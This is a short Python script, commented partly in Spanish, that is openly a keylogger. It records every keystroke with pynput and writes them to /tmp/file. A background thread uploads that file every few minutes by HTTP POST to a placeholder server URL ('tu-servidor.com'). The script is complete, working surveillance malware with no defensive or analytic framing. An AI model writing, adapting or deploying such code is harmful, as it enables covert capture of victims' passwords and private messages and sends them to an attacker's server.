#!/usr/bin/env python3

import os
import requests
import threading
import time
from pynput.keyboard import Key, Listener

keys = []
# Configuración - modifica estos valores
SERVIDOR_URL = "http://tu-servidor.com/endpoint"  # Cambia por tu URL
INTERVALO_MINUTOS = 5  # Cambia por el intervalo deseado

def on_press(key):
    keys.append(key)
    write_file(keys)
         
def write_file(keys):
    with open('/tmp/file', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
                    
            # explicitly adding a space after 
            # every keystroke for readability
            f.write(' ') 
             
def on_release(key):                    
    if key == Key.esc:
        # Stop listener
        return False

def enviar_archivo():
    """Función que envía el archivo al servidor"""
    try:
        if os.path.exists('/tmp/file'):
            with open('/tmp/file', 'rb') as f:
                files = {'file': f}
                response = requests.post(SERVIDOR_URL, files=files)
                print(f"Archivo enviado. Status: {response.status_code}")
        else:
            print("Archivo /tmp/file no existe aún")
    except Exception as e:
        print(f"Error enviando archivo: {e}")

def programar_envio():
    """Programa el envío periódico del archivo"""
    while True:
        time.sleep(INTERVALO_MINUTOS * 60)  # Convertir minutos a segundos
        enviar_archivo()

# Iniciar el hilo para envíos periódicos
thread_envio = threading.Thread(target=programar_envio, daemon=True)
thread_envio.start()

print(f"Keylogger iniciado. Enviando archivo cada {INTERVALO_MINUTOS} minutos a {SERVIDOR_URL}")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()